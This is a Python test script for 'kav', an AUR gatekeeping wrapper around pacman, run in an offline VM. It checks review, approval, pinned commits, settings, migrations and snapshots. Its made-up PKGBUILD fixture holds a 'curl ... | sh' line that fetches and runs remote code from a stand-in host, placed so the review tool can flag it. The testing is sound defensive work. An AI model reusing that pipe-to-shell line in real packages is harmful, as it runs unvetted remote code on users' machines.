#!/usr/bin/env python3
"""Check kav, the system's command over pacman: it has to refuse a package of the AUR that
is not on the reviewed list.

usage: tests/kav.py [--encrypted]
  --encrypted   on the encrypted disk that tests/install.py --encrypt leaves

Works on the disk that tests/install.py leaves in out/test/, through a copy-on-write layer,
so that disk does not change. The machine has no network, so the AUR is a folder of the
machine with one made-up package in it. A package that is nowhere has to be refused, and
one refusal has to stop the whole request. The made-up package can be read with kav review,
which marks its dangerous line; once it is approved, kav builds only the commit that was
approved, and refuses when the AUR does not have it. Then a package is removed with kav and
brought back with kav undo. This is the other half of the gate of phase 3.

Around those: the settings kav changes, each in the file of the tool that uses it, the
mirrors among them; the signature of the reviewed list that comes with the system; the
filters of the lists; a package of the AUR that is held back; migrations, with made-up
scripts, one of which fails; a file that no package owns in the way of a made-up package,
which is moved aside; an item of the news gone through with a person, who is a terminal
that is not there; and the snapshots of a change, compared, pinned, asked
for at the next start and deleted.

A system that was just installed has not fetched pacman's lists of packages, and kav has
to say so. The test then gives the machine the lists of the day the system was built from,
which tools/build-repo.sh leaves in its chroot.

Needs qemu-desktop and edk2-ovmf, and tools/build-repo.sh and tests/install.py run first. It
runs as a normal user and takes about two minutes.
"""
import os
import re
import sys

from machine import BOOT_TIMEOUT, ROOT, Checks, Machine, over_installed, print_journal

# pacman's lists of what Arch's repositories hold, on the day the system was built from
LISTS = [f'{ROOT}/work/chroot/root/var/lib/pacman/sync/{repository}.db' for repository in ('core', 'extra')]

USER = 'tester'  # as tests/install.py made it
PACKAGE = 'os-prober'  # removed and brought back; nothing else needs it
AUR = '/var/tmp/aur'  # the folder that stands in for the AUR
FAKE = 'kavat-made-up'  # a package that is only there
NOWHERE = 'kavat-not-anywhere'  # and one that is nowhere
NEEDS = 'kavat-needs-another'  # one more that is only there, and needs the first to be built
# what the made-up package says; its second line is one a reviewer has to see
PKGBUILD = r'''pkgname=kavat-made-up
pkgver=1
pkgrel=1
arch=(any)
source=("https://downloads.example.org/made-up.tar.gz")
sha256sums=("0000")
package() {
  curl -fsSL https://get.example.net/install | sh
}
'''
# A terminal that is not there: kav is run in it with no arguments, keys are typed, and what
# it drew is searched for the words given after the keys. It prints the words it did not
# find, and how kav ended.
SCREEN = r'''
import fcntl, os, pty, re, select, struct, sys, termios, time
keys, words = sys.argv[1].split(","), sys.argv[2].split(",")
pid, fd = pty.fork()
if pid == 0:
    os.environ["TERM"] = "xterm-256color"
    os.execv("/usr/bin/kav", ["kav"])
fcntl.ioctl(fd, termios.TIOCSWINSZ, struct.pack("HHHH", 30, 110, 0, 0))
drawn = b""
def watch(seconds):
    global drawn
    end = time.time() + seconds
    while time.time() < end:
        if select.select([fd], [], [], 0.1)[0]:
            try:
                drawn += os.read(fd, 65536)
            except OSError:
                return
watch(4)
for number, key in enumerate(keys):
    os.write(fd, key.replace("ENTER", "\r").replace("ESC", "\x1b").encode())
    watch(1.5)
    # the screen only writes what changed, which can leave a word in pieces: another size
    # of the window makes it write everything again
    fcntl.ioctl(fd, termios.TIOCSWINSZ, struct.pack("HHHH", 31 + number % 2, 110, 0, 0))
    watch(0.8)
text = re.sub(rb"\x1b\[[0-9;?]*[A-Za-z]", b" ", drawn).decode("utf-8", "replace")
for _ in range(2):  # the first closes what is open over the screen, the second leaves
    try:
        os.write(fd, b"q")
    except OSError:
        break
    watch(1)
print("missing:", ",".join(word for word in words if word not in text))
print("ended:", os.waitstatus_to_exitcode(os.waitpid(pid, 0)[1]))
'''
# A package that is only a file of settings, made by hand: pacman takes it from a
# repository that is a folder of the machine.
WAY = 'kavat-in-the-way'
ITS_FILE = '/usr/share/kavat-in-the-way/settings'
PKGINFO = f'''pkgname = {WAY}
pkgbase = {WAY}
pkgver = 1-1
pkgdesc = made up for the test
url = https://example.org
builddate = 1763200000
packager = tester
size = 7
arch = any
'''
# an item of the news that asks for hands, and names one command
GUIDED = ('<item><title>made-up needs manual intervention</title><link>https://archlinux.org/news/made-up/</link>'
          '<description>&lt;p&gt;Before the update, run:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;touch /var/tmp/guided&lt;/code&gt;&lt;/pre&gt;</description>'
          '<pubDate>Sun, 15 Nov 2026 10:00:00 +0000</pubDate></item>')
# kav as a normal user, pointed at the folder that stands in for the AUR
AS_USER = f'runuser -u {USER} -- env HOME=/home/{USER} KAV_AUR=file://{AUR} '


def main():
    if sys.argv[1:] not in ([], ['--encrypted']):
        sys.exit(__doc__)
    if not all(os.path.exists(path) for path in LISTS):
        sys.exit(f'{os.path.relpath(os.path.dirname(LISTS[0]))}/ holds no lists of packages: run tools/build-repo.sh first')
    pictures, machine_settings = over_installed('kav', encrypted=len(sys.argv) > 1)
    checks = Checks()

    print('asking kav for packages', flush=True)
    machine = Machine(**machine_settings)
    try:
        if not checks.report(machine.wait_for_agent(BOOT_TIMEOUT), 'the installed system boots'):
            sys.exit(1)
        status, output = machine.run('pacman -Qq yay paru 2>&1; kav --help | head -n 1')
        checks.report('yay' not in output.split() and 'paru' not in output.split() and 'usage: kav' in output,
                      'kav is there, and no other way into the AUR', output)

        status, output = machine.run(f'kav install {PACKAGE}')
        checks.report(status != 0 and 'kav update fetches them' in output,
                      "before pacman has its lists of packages, kav says so instead of guessing", output)
        machine.run('mkdir -p /var/lib/pacman/sync')
        for path in LISTS:
            machine.put(path, '/var/lib/pacman/sync')

        status, output = machine.run(f'kav install {NOWHERE}')
        checks.report(status != 0 and 'on the reviewed list' in output,
                      'kav refuses a package that is not on the reviewed list', output)
        checks.report(f'kav request {NOWHERE}' in output and 'Nothing was installed' in output,
                      'and says why, and how to ask for it', output)
        status, output = machine.run(f'kav install {PACKAGE} {NOWHERE}; pacman -Q {NOWHERE} 2>&1')
        checks.report(status != 0 and 'Nothing was installed' in output, 'one refusal stops the whole request', output)
        status, output = machine.run(f'kav install {PACKAGE}', 60)
        checks.report(status == 0, "a package of Arch's repositories goes straight to pacman", output)
        status, output = machine.run(f'kav info {PACKAGE} | grep -c "^Repository"; kav search {PACKAGE} | grep -c "{PACKAGE}"')
        checks.report(output.split() == ['1', '1'], 'kav info and kav search find it', output)
        status, output = machine.run('kav list --aur')
        checks.report(status == 0 and 'The reviewed list is empty' in output, 'the reviewed list starts empty', output)

        # the filters: what is installed, what was asked for by name, and what nothing needs
        status, output = machine.run(f'kav list --installed | wc -l; pacman -Qq | wc -l; kav list --explicit | wc -l; pacman -Qeq | wc -l; '
                                     f'kav list --explicit | grep -c "^{PACKAGE} "; kav list --orphans | grep -c "^{PACKAGE} "; '
                                     f'pacman -D --asdeps {PACKAGE} > /dev/null; kav list --orphans | grep -c -v "^kav:"; pacman -Qdtq | wc -l; pacman -D --asexplicit {PACKAGE} > /dev/null')
        lines = output.split()
        # what nothing needs is what pacman says nothing needs: a package another one offers to use is not among them
        checks.report(len(lines) == 8 and lines[0] == lines[1] and lines[2] == lines[3] and lines[4:6] == ['1', '0'] and lines[6] == lines[7],
                      'kav list shows what is installed, what was asked for by name and what nothing needs', output)
        status, output = machine.run('kav update --list')
        checks.report(status == 0 and 'Nothing waits to be brought up to date.' in output,
                      'kav update --list says what an update would bring, which is nothing', output)

        # the AUR, in a folder: one package with two commits, the second with a line to stop at
        machine.run(f"install -d -o {USER} {AUR} && cat > /var/tmp/PKGBUILD << 'END'\n{PKGBUILD}END")
        make = (f'cd {AUR} && git init -q --initial-branch=master {FAKE}.git && cd {FAKE}.git && '
                'git config user.name tester && git config user.email tester@kavat && '
                'grep -v curl /var/tmp/PKGBUILD > PKGBUILD && git add PKGBUILD && git commit -q -m first && git rev-parse HEAD && '
                'cp /var/tmp/PKGBUILD PKGBUILD && git commit -q -a -m second && git rev-parse HEAD')
        status, output = machine.run(f'runuser -u {USER} -- sh -c "{make}"')
        commits = output.split()
        if not checks.report(status == 0 and len(commits) == 2, 'a folder stands in for the AUR, with one package', output):
            sys.exit(1)
        first, second = commits

        status, output = machine.run(f'{AS_USER} kav install {FAKE}')
        checks.report(status != 0 and 'Nothing was installed' in output, 'a package that is in the AUR but not approved is refused', output)
        status, output = machine.run(f'{AS_USER} kav request {FAKE} && {AS_USER} kav list --aur')
        checks.report(status == 0 and f'{FAKE}  asked for' in output, 'kav request leaves it asked for', output)
        status, output = machine.run(f'{AS_USER} kav review {FAKE}')
        checks.report(status == 0 and 'not reviewed yet' in output and '^^^ downloads something and runs it' in output
                      and 'Downloads from: downloads.example.org, get.example.net' in output,
                      'kav review shows the package, marks its dangerous line and says where it downloads from', output)

        # approved at its first commit, as kav review does once a person says so
        status, output = machine.run(f'kav pin {FAKE} {first} "made up for the test" downloads.example.org && cat /etc/kav/allowlist.toml')
        checks.report(status == 0 and f'[packages.{FAKE}]' in output and first in output, 'an approval is written to the list of this machine', output)
        status, output = machine.run(f'{AS_USER} kav pin {FAKE} {second} x')
        checks.report(status != 0, 'and only root writes it', output)
        status, output = machine.run(f'kav info {FAKE}; kav list --aur')
        checks.report('the AUR, on the reviewed list' in output and f'{FAKE}  {first[:12]}' in output,
                      'kav info and kav list --aur show it at its approved commit', output)
        status, output = machine.run(f'{AS_USER} kav review {FAKE}')
        checks.report(status == 0 and 'what changed since the commit reviewed' in output and '^^^ downloads something and runs it' in output
                      and 'New since the review: get.example.net' in output,
                      'when the AUR moves on, kav review shows only what changed, and the new place it downloads from', output)
        # the build itself needs the network, for the clean system; what is checked is which commit it would build
        status, output = machine.run(f'kav pin {FAKE} {"0123456789abcdef" * 2 + "01234567"} "a commit the AUR does not have" && '
                                     f'{AS_USER} kav install {FAKE}')
        checks.report(status != 0 and "is not in the AUR's history of it: nothing was built" in output,
                      'kav builds the approved commit or nothing', output)
        status, output = machine.run(f'kav pin {FAKE} {first} "made up for the test" && cd /var/tmp && {AS_USER} kav install {FAKE} 2>&1; '
                                     f'cat /home/{USER}/.cache/kav/aur/{FAKE}/PKGBUILD')
        checks.report('at the commit reviewed on' in output and 'curl' not in output.split('at the commit reviewed on')[-1],
                      'what it takes to build is the approved commit, not the newest', output)

        # a package of the AUR that needs another: its first commit also needs one that nobody approved
        make = (f'cd {AUR} && git init -q --initial-branch=master {NEEDS}.git && cd {NEEDS}.git && '
                'git config user.name tester && git config user.email tester@kavat && '
                f"echo pkgname={NEEDS} > PKGBUILD && printf 'pkgbase = {NEEDS}\\n\\tdepends = glibc\\n\\tdepends = {FAKE}>=1\\n\\tmakedepends = {NOWHERE}\\n' > .SRCINFO && "
                'git add PKGBUILD .SRCINFO && git commit -q -m first && git rev-parse HEAD && '
                f'sed -i /{NOWHERE}/d .SRCINFO && git commit -q -a -m second && git rev-parse HEAD')
        status, output = machine.run(f'runuser -u {USER} -- sh -c "{make}"')
        commits = output.split()
        if checks.report(status == 0 and len(commits) == 2, 'a second package in the folder needs the first', output):
            status, output = machine.run(f'kav pin {NEEDS} {commits[0]} "needs another" && cd /var/tmp && {AS_USER} kav install {NEEDS} 2>&1')
            checks.report(status != 0 and f'{NEEDS} needs {NOWHERE}, which is not in Arch' in output and f'kav request {NOWHERE}' in output,
                          'a package of the AUR that needs one that is not approved is refused, by the name of what it needs', output)
            status, output = machine.run(f'kav pin {NEEDS} {commits[1]} "needs another" && cd /var/tmp && {AS_USER} kav install {NEEDS} 2>&1')
            checks.report(f'also from the AUR, because the above need them, each one reviewed by itself: {FAKE}' in output,
                          'what it needs from the AUR is built before it, when that is approved too', output)

        # only a package of the AUR can be held back; one that is, is written in kav's own file
        status, output = machine.run(f'kav hold {PACKAGE} 2>&1 | head -n 1; kav hold {FAKE} && grep -c \'^hold = \\["{FAKE}"\\]\' /etc/kav/kav.toml; '
                                     f'kav unhold {FAKE} && grep -c "^hold = \\[\\]" /etc/kav/kav.toml')
        lines = output.splitlines()
        checks.report(len(lines) == 5 and 'is not a package of the AUR' in lines[0] and lines[2] == '1' and lines[4] == '1',
                      'kav hold keeps a package of the AUR as it is, and refuses one of Arch\'s', output)

        machine.run(f"cat > /var/tmp/screen.py << 'END'\n{SCREEN}END\nchmod 644 /var/tmp/screen.py")
        status, output = machine.run(f'{AS_USER} python3 /var/tmp/screen.py "6,4,3,/,{PACKAGE},ENTER,ENTER,x,?" '
                                     f'"Dashboard,Last snapshot,Installed,Health,Recent activity,Doctor,ok ,{FAKE},looking for,{PACKAGE},Version,Help"', 60)
        checks.report(output == 'missing: \nended: 0',
                      'kav with no arguments opens everything on one screen: its tabs, a search, a record and the help', output)
        # the mouse: a click on the last tab, at its place in the first line
        status, output = machine.run(f'{AS_USER} python3 /var/tmp/screen.py "ESC[<0;80;1M" "Looks for updates,The mirror in use,locked"', 60)
        checks.report(output == 'missing: \nended: 0', 'a click of the mouse on a tab opens it, and Settings shows what is locked', output)
        status, output = machine.run(f'{AS_USER} python3 /var/tmp/screen.py "2,f" "showing: installed"', 60)
        checks.report(output == 'missing: \nended: 0', 'in Browse, f goes through the filters', output)
        status, output = machine.run('kav < /dev/null | head -n 1')
        checks.report('usage: kav' in output, 'and away from a terminal it says how it is used', output)

        status, output = machine.run('kav doctor')
        checks.report(status == 0 and 'FAIL' not in output, 'kav doctor finds the system healthy', output)

        status, output = machine.run('touch /var/lib/pacman/db.lck; kav doctor | grep -c "^FAIL"; kav fix lock && kav doctor | grep -c "^FAIL"; '
                                     'kav fix everything 2>&1 | head -n 1')
        checks.report(output.splitlines()[:2] == ['1', '0'] and 'kav fix takes' in output,
                      'kav fix mends what doctor found, and says what it can mend', output)

        status, output = machine.run('kav set | head -n 2; kav set downloads 8 > /dev/null && grep -c "^ParallelDownloads = 8" /etc/pacman.conf; '
                                     'kav set snapshots 20 > /dev/null && grep -c \'^NUMBER_LIMIT="20"\' /etc/snapper/configs/root; '
                                     'kav set downloads 99 2>&1 | head -n 1; kav set downloads 5; kav set snapshots 10')
        lines = output.splitlines()
        checks.report(len(lines) > 4 and lines[0].split()[::len(lines[0].split()) - 1] == ['downloads', '5'] and lines[1].split()[-1] == '10'
                      and lines[2] == '1' and lines[3] == '1' and 'kav set takes' in lines[4],
                      "kav set reads and changes pacman's downloads at once and snapper's snapshots kept, each in its own file", output)

        # how often updates are looked for is the timer's own, in systemd's files
        status, output = machine.run('kav set | grep "^check"; kav set check daily > /dev/null && grep -c "^OnCalendar=daily" /etc/systemd/system/kav-check.timer.d/kav.conf; '
                                     'systemctl is-active kav-check.timer; kav set check never > /dev/null; systemctl is-enabled kav-check.timer; kav set | grep "^check"; '
                                     'kav set check weekly > /dev/null; systemctl is-active kav-check.timer; kav set | grep "^check"; kav set check hourly 2>&1 | head -n 1')
        lines = output.splitlines()
        checks.report(len(lines) >= 8 and lines[0].split()[-1] == 'weekly' and lines[1:3] == ['1', 'active'] and lines[3] == 'masked' and lines[4].split()[-1] == 'never'
                      and lines[5] == 'active' and lines[6].split()[-1] == 'weekly' and 'kav set takes' in lines[7],
                      'kav set check changes how often the timer looks for updates, and never switches it off', output)
        status, output = machine.run('kav check 2>&1; systemctl start kav-check.service 2>&1; systemctl is-failed kav-check.service', 180)
        checks.report('the repositories could not be reached' in output and output.splitlines()[-1] == 'inactive',
                      'without a network the look for updates says so, and its service does not count as failed', output)

        # the versions kept in the cache and the processors of a build are kav's own, in its file
        status, output = machine.run('cd /var/cache/pacman/pkg && touch made-up-1.0-1-any.pkg.tar.zst made-up-1.0-2-any.pkg.tar.zst made-up-1.0-10-any.pkg.tar.zst && '
                                     'kav set cache 1 > /dev/null && ls made-up-*; grep -c "^cache = 1" /etc/kav/kav.toml; kav set jobs 4 > /dev/null; '
                                     'kav set | grep -E "^(cache|jobs|mirror)" | sed "s/.* //"; kav set cache 3 > /dev/null; kav set jobs 0 > /dev/null; '
                                     'kav set | grep "^jobs" | sed "s/.* //"; kav set | grep -c "always"; rm -f made-up-*')
        lines = output.splitlines()
        checks.report(len(lines) == 7 and lines[0] == 'made-up-1.0-10-any.pkg.tar.zst' and lines[1:4] == ['1', '1', '4'] and lines[4] != '' and lines[5:] == ['all', '4'],
                      "kav set cache keeps only the newest versions in pacman's cache, kav set jobs is in kav's own file, and what protects the system is shown locked", output)

        # the mirrors are pacman's list of them: those of a country, as Arch lists them, with a
        # file standing in for Arch's answer, or the worldwide ones the system came with
        status, output = machine.run('printf "## Spain\\n#Server = https://one.example.es/archlinux/\\$repo/os/\\$arch\\n#Server = https://two.example.es/\\$repo/os/\\$arch\\n" > /tmp/mirrors; '
                                     'export KAV_MIRRORS=/tmp/mirrors; kav set mirror es > /dev/null && grep -c "^Server = " /etc/pacman.d/mirrorlist; '
                                     'kav set | grep "^mirror" | sed "s/.* //"; kav set mirror spain 2>&1 | head -n 1; : > /tmp/mirrors; kav set mirror fr 2>&1 | head -n 1; '
                                     'kav set | grep "^mirror" | sed "s/.* //"; kav set mirror worldwide > /dev/null && grep -c "^Server = " /etc/pacman.d/mirrorlist; '
                                     'kav set | grep "^mirror" | sed "s/.* //"; pacman-conf --repo-list | grep -c "^core$"')
        lines = output.splitlines()
        checks.report(len(lines) == 8 and lines[:2] == ['4', 'one.example.es'] and 'kav set mirror takes' in lines[2] and 'Arch lists no mirrors in FR' in lines[3]
                      and lines[4:] == ['one.example.es', '2', 'geo.mirror.pkgbuild.com', '1'],
                      "kav set mirror writes pacman's list of mirrors with those of a country or the worldwide ones, and leaves it alone when it gets none", output)

        # the list that comes with the system counts only with its signature: the machine's own
        # list stands in for it, in another folder, signed with a key made here
        status, output = machine.run('export GNUPGHOME=/tmp/key KAV_DATA=/tmp/data; mkdir -m 700 -p /tmp/key /tmp/data; cp /etc/kav/allowlist.toml /tmp/data/; '
                                     'kav list --aur 2>&1 | head -n 1; '
                                     'gpg --batch --quiet --pinentry-mode loopback --passphrase "" --quick-generate-key "made up for the test" ed25519 sign never 2> /dev/null; '
                                     'gpg --batch --yes --output /tmp/data/allowlist.toml.sig --detach-sign /tmp/data/allowlist.toml 2> /dev/null; '
                                     'gpg --batch --yes --output /tmp/data/allowlist.gpg --export 2> /dev/null; '
                                     f'kav list --aur 2>&1 | grep -c "^{FAKE} "; echo "# changed" >> /tmp/data/allowlist.toml; kav list --aur 2>&1 | head -n 1; '
                                     'gpgconf --kill all 2> /dev/null', 60)
        lines = output.splitlines()
        checks.report(len(lines) == 3 and 'it holds packages and is not signed' in lines[0] and lines[1] == '1' and 'is not its signature' in lines[2],
                      'the reviewed list that comes with the system is taken with its signature, and not without it or changed after it', output)

        # migrations: the record starts with what is there, and each new script runs once, in order
        there = '/usr/share/kavat/migrations'
        status, output = machine.run(f'kav migrate && {AS_USER} kav migrate && ls -d /var/lib/kavat/migrations /home/{USER}/.local/state/kavat/migrations | wc -l')
        checks.report(status == 0 and output.splitlines()[-1] == '2', 'the first time, kav migrate starts its records and runs nothing', output)
        machine.run(f"cd {there} && echo 'touch /var/tmp/migrated-1' > 0001-made-up.sh && echo 'exit 3' > 0002-breaks.sh && "
                    f"echo 'touch /var/tmp/migrated-3' > 0003-after.sh && echo 'touch $HOME/migrated-mine; id -un > $HOME/migrated-as' > user/0001-mine.sh")
        status, output = machine.run('kav migrate --list | grep -c "waits$"; kav migrate; echo "status $?"; ls /var/tmp/migrated-1 /var/tmp/migrated-3 2>&1')
        checks.report(output.splitlines()[0] == '3' and 'the migration 0002-breaks.sh failed' in output and 'The 1 after it wait' in output and 'status 1' in output
                      and '/var/tmp/migrated-1\n' in output and "migrated-3': No such file" in output,
                      'a migration runs as root; one that fails stops the ones after it, and is named', output)
        status, output = machine.run(f'echo "exit 0" > {there}/0002-breaks.sh; rm /var/tmp/migrated-1; kav migrate && ls /var/tmp/migrated-1 /var/tmp/migrated-3 2>&1; '
                                     f'{AS_USER} kav migrate && cat /home/{USER}/migrated-as; kav migrate; {AS_USER} kav migrate; kav migrate --list | grep -c "ran$"; '
                                     f'rm {there}/000* {there}/user/000*')
        lines = output.splitlines()
        checks.report('/var/tmp/migrated-3' in lines and "migrated-1': No such file" in output and USER in lines and lines[-3:] == ['kav: no migration waits.'] * 2 + ['3'],
                      'once mended it runs, then the one that waited; each runs once, and the person\'s run as the person', output)

        # a file that no package owns, where a package wants to put its own
        status, output = machine.run(f"mkdir -p /var/tmp/made/pkg{os.path.dirname(ITS_FILE)} /var/tmp/made/repo && cd /var/tmp/made/pkg && echo theirs > .{ITS_FILE} && "
                                     f"cat > .PKGINFO << 'END'\n{PKGINFO}END\n"
                                     f"bsdtar -czf ../repo/{WAY}-1-1-any.pkg.tar.gz .PKGINFO usr && cd ../repo && repo-add -q made.db.tar.gz {WAY}-1-1-any.pkg.tar.gz 2>&1 && "
                                     "printf '[made]\\nSigLevel = Optional TrustAll\\nServer = file:///var/tmp/made/repo\\n' >> /etc/pacman.conf && "
                                     f"cp made.db.tar.gz /var/lib/pacman/sync/made.db && mkdir -p {os.path.dirname(ITS_FILE)} && echo mine > {ITS_FILE} && pacman -Si {WAY} | head -n 1")
        if checks.report(status == 0 and 'made' in output, 'a made-up package is in a repository that is a folder', output):
            status, output = machine.run(f'yes | kav install {WAY} 2>&1; echo "status $?"; cat {ITS_FILE} /var/lib/kav/aside/*{ITS_FILE}; pacman -Qo {ITS_FILE}', 60)
            checks.report('exists in filesystem' in output and 'Moving it aside, to /var/lib/kav/aside/' in output and 'status 0' in output
                          and 'theirs\nmine\n' in output and f'is owned by {WAY}' in output,
                          'a file that no package owns is moved out of a package\'s way, kept, and the change tried once more', output)
        machine.run(f"sed -i '/^\\[made\\]$/,$d' /etc/pacman.conf; rm -f /var/lib/pacman/sync/made.db; pacman -Rns --noconfirm {WAY}")

        machine.run("printf '<rss><item><title>Old news</title><link>https://archlinux.org/news/old/</link><description>nothing</description>"
                    "<pubDate>Sat, 01 Nov 2026 10:00:00 +0000</pubDate></item></rss>' > /tmp/feed")
        status, output = machine.run('export KAV_NEWS=/tmp/feed; kav news; '
                                     "sed -i 's|<rss>|<rss><item><title>grub needs manual intervention</title><link>https://archlinux.org/news/grub/</link>"
                                     "<description>\\&lt;p\\&gt;Run grub-install again.\\&lt;/p\\&gt;</description><pubDate>Sat, 14 Nov 2026 10:00:00 +0000</pubDate></item>|' /tmp/feed; "
                                     'kav update 2>&1 | tail -n 2; echo "status ${PIPESTATUS[0]}"; kav news | head -n 5 | tr "\\n" "|"; echo; kav news')
        lines = output.split('\n')
        checks.report(lines[0] == 'kav: there is no news since the last time.' and 'asks for something to be done by hand' in output and 'the update waits' in output
                      and 'status 1' in output and 'Run grub-install again.' in output and lines[-1] == 'kav: there is no news since the last time.',
                      "kav update waits for Arch's news to be read when an item asks for something to be done by hand", output)

        # an item that asks for hands, with a person there: script gives kav a terminal, and the answers
        machine.run(f"sed -i 's|<rss>|<rss>{GUIDED}|' /tmp/feed".replace('&', '\\&'))
        guided = 'export KAV_NEWS=/tmp/feed; printf "{}" | script -qec "kav update" /dev/null 2>&1 | tr -d "\\r"; '
        status, output = machine.run(guided.format('y\\nn\\n') + 'ls /var/tmp/guided; cat /var/lib/kav/interventions 2>&1', 60)
        checks.report('The commands it names:' in output and 'Run `touch /var/tmp/guided` now, as root?' in output and 'kav: it ran.' in output
                      and 'the update waits for: made-up needs manual intervention' in output and '/var/tmp/guided\n' in output and 'interventions: No such file' in output,
                      'kav update goes through an item that asks for hands: it shows its command, runs it on a yes, and waits until the item is dealt with', output)
        # the second time the command is left alone and the item is dealt with: the update goes on, as far as it can with no network
        status, output = machine.run('rm /var/tmp/guided; ' + guided.format('n\\ny\\n') + 'ls /var/tmp/guided 2>&1; cat /var/lib/kav/interventions; kav news', 180)
        checks.report("guided': No such file" in output and 'https://archlinux.org/news/made-up/\t' in output and 'synchronizing package databases' in output.lower()
                      and output.splitlines()[-1] == 'kav: there is no news since the last time.',
                      'a no runs nothing; once the item is dealt with that is kept, the update goes on, and it is not asked again', output)

        print('removing a package and going back', flush=True)
        status, output = machine.run(f'yes | kav remove {PACKAGE}', 120)
        checks.report(status == 0 and machine.run(f'pacman -Q {PACKAGE}')[0] != 0, f'kav remove takes {PACKAGE} out', output)

        # the snapshots of that change: what it did, how the system differs from before it, pinning and deleting
        status, output = machine.run('kav snapshots')
        before = [line.split()[0] for line in output.splitlines() if f'before: removed {PACKAGE}' in line]
        after = [line.split()[0] for line in output.splitlines() if f'after: removed {PACKAGE}' in line]
        if checks.report(status == 0 and len(before) == 1 and len(after) == 1, 'kav snapshots says what the change of each snapshot did', output):
            before, after = before[0], after[0]
            status, output = machine.run(f'kav snapshots compare {before}; kav snapshots compare {after} | tail -n 1')
            checks.report('installed' not in output and f'removed     {PACKAGE}' in output and '1 package differs' in output and 'no package differs' in output,
                          'kav snapshots compare shows the packages that differ from the system now', output)
            # the room a snapshot takes is measured only when asked for
            status, output = machine.run(f'kav snapshots size {before} | grep "^ *{before} "; kav snapshots size 2> /dev/null | grep -c "· takes [0-9.]* [KMG]*i*B"; '
                                         'kav snapshots | wc -l; kav snapshots | grep -c "· takes "', 120)
            lines = output.splitlines()
            checks.report(len(lines) == 4 and lines[0].split()[0] == before and re.search(r'· takes [0-9.]+ (B|KiB|MiB|GiB)$', lines[0]) is not None
                          and lines[1] == lines[2] and lines[3] == '0',
                          'kav snapshots size says how much room each snapshot alone takes, and the plain list does not measure', output)
            status, output = machine.run(f'kav snapshots pin {before} > /dev/null && kav snapshots | grep "^ *{before} "; '
                                         f'kav snapshots unpin {before} > /dev/null && kav snapshots | grep "^ *{before} "')
            lines = output.splitlines()
            checks.report(len(lines) == 2 and lines[0].endswith('pinned') and not lines[1].endswith('pinned'),
                          'a snapshot is pinned, so it is not cleaned away, and unpinned', output)
            # asking for the next start to be from a snapshot leaves its number for GRUB; it is taken back, so the machine starts as ever
            status, output = machine.run(f'kav snapshots boot {before} && grub-editenv /boot/grub/grubenv list | grep "^kavat_once_snapshot="; '
                                         'grub-editenv /boot/grub/grubenv unset kavat_once_snapshot; kav snapshots boot 999999 2>&1 | tail -n 1; '
                                         'grub-editenv /boot/grub/grubenv list | grep -c "^kavat_once_snapshot="')
            lines = output.splitlines()
            checks.report(f'kavat_once_snapshot={before}' in lines and 'nothing restarts by itself' in output
                          and 'kavat-boot-once ended with status 1' in output and lines[-1] == '0',
                          'kav snapshots boot asks for the next start to be from a snapshot, once, and restarts nothing', output)
            status, output = machine.run(f'kav snapshots delete {after} < /dev/null 2>&1 | tail -n 1; kav snapshots delete {after} --yes && kav snapshots | grep -c "^ *{after} "; '
                                         'kav snapshots delete 0 2>&1')
            checks.report('--yes' in output.splitlines()[0] and f'snapshot {after} is deleted' in output and output.splitlines()[-2] == '0'
                          and 'is not the number of a snapshot' in output,
                          'a snapshot is deleted only on a yes, and the system itself is not one', output)

        status, output = machine.run('kav undo --yes', 120)
        checks.report(status == 0 and f'pacman -Rns -- {PACKAGE}' in output and 'restart to be back there' in output,
                      'kav undo names the change and goes back to before it', output)
        if checks.failed:
            print_journal(machine)
        checks.report(machine.power_off(), 'the machine switches off')
    finally:
        machine.stop()
    if checks.failed:
        sys.exit(1)

    machine = Machine(**machine_settings)
    try:
        if checks.report(machine.wait_for_agent(BOOT_TIMEOUT), 'the system boots'):
            status, output = machine.run(f'pacman -Q {PACKAGE}')
            checks.report(status == 0, f'{PACKAGE} is back', output)
    finally:
        machine.stop()
    sys.exit(1 if checks.failed else 0)


if __name__ == '__main__':
    main()
